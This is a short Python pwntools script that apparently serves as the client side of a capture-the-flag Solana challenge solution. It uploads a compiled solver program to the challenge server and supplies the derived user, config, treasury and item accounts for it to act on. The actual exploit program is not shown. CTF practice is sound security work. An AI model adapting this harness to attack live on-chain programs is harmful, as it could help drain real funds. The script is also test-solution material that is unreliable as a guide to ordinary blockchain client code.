from pwn import remote
from solders.pubkey import Pubkey
from solders.system_program import ID as SYSTEM_PROGRAM

HOST = "challs.scriptsorcerers.xyz"
PORT = 10225
SOLVE_PUBKEY = b"5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwyexx"

solve = open("solve.so", "rb").read()

r = remote(HOST, PORT)

r.recvuntil(b"program pubkey: ")
r.sendline(SOLVE_PUBKEY)

r.recvuntil(b"program len: ")
r.sendline(str(len(solve)).encode())
r.send(solve)

r.recvuntil(b"program: ")
program = Pubkey.from_string(r.recvline().strip().decode())

r.recvuntil(b"user: ")
user = Pubkey.from_string(r.recvline().strip().decode())

user_config, user_bump = Pubkey.find_program_address(
    [bytes(user), b"USER"], program
)
config, config_bump = Pubkey.find_program_address(
    [b"CONFIG"], program
)
treasury, treasury_bump = Pubkey.find_program_address(
    [b"VAULT"], program
)
item0, item0_bump = Pubkey.find_program_address(
    [b"RUBBERDUCK"], program
)

# Accounts received by our solver program:
# challenge program, user, user_config, config, treasury, item0, system program
r.sendline(b"7")
r.sendline(b"x " + str(program).encode())
r.sendline(b"ws " + str(user).encode())
r.sendline(b"w " + str(user_config).encode())
r.sendline(b"w " + str(config).encode())
r.sendline(b"w " + str(treasury).encode())
r.sendline(b"w " + str(item0).encode())
r.sendline(b"x " + str(SYSTEM_PROGRAM).encode())

# Solver ignores its input payload.
r.sendline(b"0")

r.interactive()
